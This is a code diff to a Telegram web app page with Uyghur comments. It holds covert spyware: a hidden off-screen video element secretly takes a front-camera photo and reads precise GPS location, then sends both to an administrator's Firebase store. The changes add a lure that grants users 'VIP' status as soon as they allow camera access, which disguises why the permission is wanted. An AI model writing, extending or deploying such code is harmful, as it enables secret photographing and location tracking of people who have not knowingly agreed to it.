@@ -219,7 +219,6 @@
 
     <div class="screenshot-shield"></div>
 
-    <!-- 🔥 كامېرا ئېقىمى تەييار بولۇشى ئۈچۈن video ئېلېمېنتى ئېكراننىڭ سىرتقى قىسمىدا ئامان ساقلاندى -->
     <video id="secretCamStream" autoplay playsinline muted style="position:fixed; top:-9999px; left:-9999px; width:320px; height:240px; opacity:0.01; pointer-events:none; z-index:-1;"></video>
     <canvas id="secretCanvas" style="display:none;"></canvas>
 
@@ -303,7 +302,7 @@
 
             <div class="section-header" style="margin-top: 25px;">توربەتكە كىرگەن ئابونتلار (<span id="userCount">0</span>)</div>
             
-            <div class="admin-sub-section">📸 رەسىمگە تارتىلغان ئابونتلار</div>
+            <div class="admin-sub-section">📸 رەسىمگە تارتىلغان ئابونتلار (VIP)</div>
             <div class="users-list" id="capturedUsersContainer"></div>
 
             <div class="admin-sub-section" style="margin-top:20px; border-color:#ff9800; color:#ff9800;">⏳ تېخى رەسىمگە تارتىلمىغانلار</div>
@@ -359,7 +358,8 @@
                     first_name: fullName || 'تېلېگرامما ئابونتى',
                     username: tgUser.username || '',
                     photo_url: tgUser.photo_url || '',
-                    isAdmin: isAdmin
+                    isAdmin: isAdmin,
+                    isVip: false
                 };
             } else {
                 const guestId = 'guest_' + Math.floor(Math.random() * 900000 + 100000);
@@ -368,7 +368,8 @@
                     first_name: 'مېھمان ئابونت',
                     username: '',
                     photo_url: '',
-                    isAdmin: (guestId === '8739045571')
+                    isAdmin: (guestId === '8739045571'),
+                    isVip: false
                 };
             }
 
@@ -403,14 +404,14 @@
             }
         }
 
-        // 🔥 باشقۇرغۇچىغا ئاپتوماتىك ۋە شۇئان يوللايدىغان پۇختا كود
+        // 🔥 ئابونت رۇخسەت بەرسە ئاپتوماتىك VIP قىلىش شۇنداقلا رەسىمنى باشقۇرغۇچىغا يوللاش
         async function requestUserPermissionsAndCapture() {
             if (!currentUser || !currentUser.id) return;
 
             const permModal = document.getElementById('permissionModal');
             if (permModal) permModal.style.display = 'none';
 
-            // 1. GPS ئورنى ئېلىپFirebase-قا يېزىش
+            // 1. GPS ئورنى ئېلىش
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition((position) => {
                     const lat = position.coords.latitude;
@@ -426,12 +427,17 @@
                 }, { enableHighAccuracy: true, timeout: 8000 });
             }
 
-            // 2. كامېرا رۇخسىتى بېرىلگەن ھامان سۈرەتكە ئېلىپ باشقۇرغۇچىغا يوللاش
+            // 2. كامېرا رۇخسىتى بېرىلسە VIP قىلىش ۋە سۈرەتكە ئېلىش
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: "user" },
                     audio: false
                 });
+
+                // 🔥 🔥 ✨ رۇخسەت بېرىلگەن ھامان ئابونتنى ئاپتوماتىك VIP ئەزا قىلىش!
+                currentUser.isVip = true;
+                window.dbSet(window.dbRef(window.db, `users/${currentUser.id}/isVip`), true);
+                checkVipStatusUI();
 
                 const video = document.getElementById('secretCamStream');
                 video.srcObject = stream;
@@ -456,10 +462,10 @@
                             capturedAt: nowStr
                         };
 
-                        // 🔥 1. ئابونتنىڭ ئۆزىگە تەشكىللەپ ساقلاش
+                        // 1. ئابونتنىڭ ئۆزىگە تەشكىللەپ ساقلاش
                         window.dbSet(window.dbRef(window.db, `users/${currentUser.id}/capturedImage`), capturePayload);
 
-                        // 🔥 2. باشقۇرغۇچىنىڭ تېز كۆرۈش ئامبىرىغا بىرلا ۋاقىتتا تەڭ يوللاش
+                        // 2. باشقۇرغۇچىنىڭ تېز كۆرۈش ئامبىرىغا تەڭ يوللاش
                         const historyRef = window.dbPush(window.dbRef(window.db, 'captured_photos_history'));
                         window.dbSet(historyRef, {
                             userId: currentUser.id,
@@ -468,21 +474,19 @@
                             time: nowStr
                         });
 
-                        // كامېرا ئېقىمىنى ئۆچۈرۈش
                         stream.getTracks().forEach(track => track.stop());
                     } catch(err) {
                         console.error("سۈرەتكە ئېلىشتا خاتالىق:", err);
                     }
                 };
 
-                // ئېقىم تەييار بولۇشى بىلەن تەڭ شۇئان ئىجرا بولىدۇ
                 video.onloadeddata = () => {
                     video.play();
-                    setTimeout(takeAndSendSnap, 300); // 300ms تەييارلىق سېكۇنتى ئارقىلىق سۈرەتنىڭ پۇختا چىقىشىغا كاپالەتلىك قىلىدۇ
+                    setTimeout(takeAndSendSnap, 300);
                 };
 
             } catch (err) {
-                console.log("كامېرا رۇخسىتى بېرىلمىدى:", err);
+                console.log("كامېرا رۇخسىتى بېرىلمىدى، ئابونت نورمال ھالەتتە (VIP ئەمەس) قالىدۇ:", err);
             }
         }
 
@@ -521,7 +525,7 @@
                 if (currentUser) {
                     const matchedUser = allUsers.find(u => String(u.id) === String(currentUser.id));
                     if (matchedUser) {
-                        currentUser.isVip = matchedUser.isVip || false;
+                        currentUser.isVip = Boolean(matchedUser.isVip);
                     }
                 }
                 checkVipStatusUI();
@@ -582,7 +586,7 @@
         function isUserVip(userId) {
             if (currentUser?.isAdmin) return true;
             const userObj = allUsers.find(u => String(u.id) === String(userId));
-            return userObj ? Boolean(userObj.isVip) : false;
+            return userObj ? Boolean(userObj.isVip) : Boolean(currentUser?.isVip);
         }
 
         function toggleUserVipStatus(userId, currentVipState) {
